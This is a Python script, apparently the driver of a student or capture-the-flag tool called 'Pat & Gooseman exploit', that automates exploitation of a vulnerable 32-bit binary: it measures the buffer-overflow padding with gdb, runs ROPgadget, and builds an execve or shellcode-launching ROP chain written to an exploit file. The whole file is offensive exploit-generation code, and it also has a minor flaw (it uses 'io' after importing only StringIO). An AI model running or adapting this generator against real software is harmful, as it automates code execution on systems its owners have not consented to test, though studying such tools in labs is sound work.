import argparse
import binascii
import subprocess
from io import StringIO
from src.ParseChain import *
from src.GadgetFinder import *
from src.ExecveBuilder import *
from src.MprotectBuilder import *
from src.ShellcodeCompiler import *

import src.gdb as gdb

#python3 Main.py binaries/vuln3-32 -s shellcodes/bash -o exp

def read_hex_file(file_path):
    bytes = b''
    with open(file_path, 'r') as file:
        for line in file:
            hex_values = line.split()

            for hex_value in hex_values:
                bytes += binascii.unhexlify(hex_value[2:])
    return bytes


def main():
    parser = argparse.ArgumentParser(description='Pat & Gooseman exploit')
    parser.add_argument('binary', metavar='B', type=str, nargs='+',
                    help='binary')
    parser.add_argument('-c', help='command to compile')
    parser.add_argument('-s', help='shellcode to compile (file with shellcode as string of bytes)')
    parser.add_argument('-o', help='exploit file')

    args = parser.parse_args()

    outfile = 'exp' if args.o is None else args.o

    sc_mode = False
    shellcode = b''
    if args.s is not None:
        try:
            shellcode = read_hex_file(args.s)
            sc_mode = True
        except Exception as e:
            print(e)
            print('Invalid Shellcode')
            exit()

    binary = args.binary[0]

    buffer = gdb.get_padding_gdb(binary)
    print("Found padding length of " + str(buffer))

    sc = ShellcodeCompiler(shellcode)
    sc.setup()

    eb = ExecveBuilder(['eax', 'ebx', 'ecx', 'edx']) if not sc_mode else sc.execve_builder
    command_rg = ["python3", "./ROPgadget/ROPgadget.py", "--binary", args.binary[0], "--ropchain"]

    if not sc_mode or (sc_mode and sc.req_stack):
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_xor_src(output_stream)

        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_mov_dst(output_stream)

    if sc_mode:
        sc.execve_builder = eb
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            sc.start(output_stream, buffer)

        sc.write_chain(outfile)

    else:
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.build_chain(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)

        eb.write_chain(outfile)

        gadgets = eb.gadget_finder.gadgets
        for k, v in gadgets.items():
            print(k + " :: " + str(hex(v.address)) + ", " + str(v.complexity )+ ", " + str(v.side_pops))

        print("DATA " + str(hex(eb.gadget_finder.data)))

    subprocess.run("rm disassembly.asm", stdout=subprocess.PIPE, shell=True)
    subprocess.run("rm input", stdout=subprocess.PIPE, shell=True)


main()